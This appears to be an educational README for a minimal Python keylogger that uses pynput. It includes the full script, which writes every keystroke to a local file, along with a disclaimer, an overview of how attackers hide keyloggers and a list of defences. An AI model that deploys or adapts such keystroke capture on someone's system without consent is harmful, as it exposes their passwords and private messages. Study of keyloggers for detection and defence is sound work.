# Python Keylogger

This is a simple Python script that logs keyboard activity using the `pynput` library. It records keystrokes and saves them to a local file called `keyfile.txt`.

This tool is intended solely for educational and ethical testing purposes — such as learning how keyloggers function, how they can be detected, and how to defend against them.

---

## Disclaimer

**This project is for educational use only.**  
Do not run this script on any system without explicit written permission from the owner. Unauthorized use may violate local, state, or federal laws.

---

## How It Works

- Listens for keyboard input using `pynput.keyboard`
- Logs printable characters to `keyfile.txt`
- Records special keys like `Enter`, `Tab`, `Shift` as `[Key.enter]`, `[Key.shift]`, etc.
- Stops listening when the Escape key is pressed

### Code Overview

```python
from pynput import keyboard 

def key_pressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            logkey.write(key.char)
        except AttributeError:
            logkey.write(f'[{key}]')

def on_release(key):
    # Stop listener if Esc is pressed
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    with keyboard.Listener(on_press=key_pressed, on_release=on_release) as listener:
        listener.join()

```
## Why Keyloggers Are Dangerous
Keyloggers are often hidden and run silently in the background. Malicious actors can:
- Embed them into system startup scripts or schedule them using tools like Task Scheduler
- Capture sensitive data, such as passwords and personal messages
- Use misleading process names to avoid detection in the Task Manager
- Exfiltrate logged data to remote servers

## How to Protect Against Keyloggers
-Use up-to-date antivirus or anti-malware software
-Regularly check running processes in Task Manager or a system monitor
-Monitor for unusual file changes or log generation
-Educate users on phishing and software hygiene
-Implement application whitelisting and least-privilege policies
